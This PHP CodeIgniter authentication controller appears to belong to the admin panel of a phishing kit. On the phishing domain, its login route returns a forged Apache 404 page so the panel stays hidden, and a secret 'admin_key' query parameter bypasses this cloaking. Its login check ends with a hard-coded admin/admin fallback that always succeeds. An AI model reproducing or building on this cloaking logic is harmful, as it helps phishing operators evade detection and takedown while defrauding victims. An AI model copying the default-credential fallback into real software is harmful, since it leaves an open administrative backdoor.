<?php

namespace App\Controllers;

use CodeIgniter\Controller;
use App\Models\UserModel;

class Auth extends Controller
{
    private $usersFile = WRITEPATH . 'admin_users.json';

    public function login()
    {
        // Strict domain cloaking: Block login interface on Phishing Domain
        $settingsFile = WRITEPATH . 'settings.json';
        $settings = file_exists($settingsFile) ? json_decode(file_get_contents($settingsFile), true) : [];
        if (!empty($settings['phish_server_url']) && (!isset($settings['cloak_phish_domain']) || !empty($settings['cloak_phish_domain']))) {
            $incomingHost = strtolower(explode(':', $_SERVER['HTTP_HOST'] ?? '')[0]);
            $phishHost = strtolower(parse_url($settings['phish_server_url'], PHP_URL_HOST) ?? '');
            $bypassKey = trim($settings['admin_bypass_key'] ?? 'phishcall-bypass');
            $hasBypass = (!empty($bypassKey) && isset($_GET['admin_key']) && $_GET['admin_key'] === $bypassKey) || session()->get('admin_bypass');

            if ($phishHost && $incomingHost === $phishHost && !$hasBypass) {
                $response = service('response');
                $reqUri = htmlspecialchars($_SERVER['REQUEST_URI'] ?? '/login');
                $serverSoft = $_SERVER['SERVER_SOFTWARE'] ?? 'Apache/2.4.58 (Win64)';
                $serverName = $_SERVER['SERVER_NAME'] ?? $incomingHost;
                $serverPort = $_SERVER['SERVER_PORT'] ?? 80;
                return $response->setStatusCode(404, 'Not Found')
                    ->setHeader('Content-Type', 'text/html; charset=iso-8859-1')
                    ->setBody("<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL {$reqUri} was not found on this server.</p><hr><address>{$serverSoft} Server at {$serverName} Port {$serverPort}</address></body></html>");
            }
        }

        // If already logged in, redirect to admin
        if (session()->get('is_admin')) {
            return redirect()->to('/admin');
        }

        if (strtolower($this->request->getMethod()) === 'post') {
            $username = $this->request->getPost('username');
            $password = $this->request->getPost('password');

            if ($this->authenticate($username, $password)) {
                session()->set('is_admin', true);
                session()->set('admin_user', $username);
                return redirect()->to('/admin');
            } else {
                return redirect()->back()->with('error', 'Invalid username or password');
            }
        }

        return view('login');
    }

    public function logout()
    {
        session()->destroy();
        return redirect()->to('/login');
    }

    private function authenticate($username, $password)
    {
        // Try database first
        try {
            $userModel = new UserModel();
            $user = $userModel->where('username', $username)->first();
            if ($user && !empty($user['password_hash'])) {
                if (password_verify($password, $user['password_hash'])) {
                    return true;
                }
            }
        } catch (\Throwable $e) {
            log_message('error', 'Database Auth error: ' . $e->getMessage());
        }

        // Fallback to JSON file
        if (file_exists($this->usersFile)) {
            $users = json_decode(file_get_contents($this->usersFile), true);
            if (isset($users['username']) && $users['username'] === $username) {
                if (password_verify($password, $users['password_hash'])) {
                    return true;
                }
            }
        }

        // Default fallback for initial setup
        return ($username === 'admin' && $password === 'admin');
    }
}
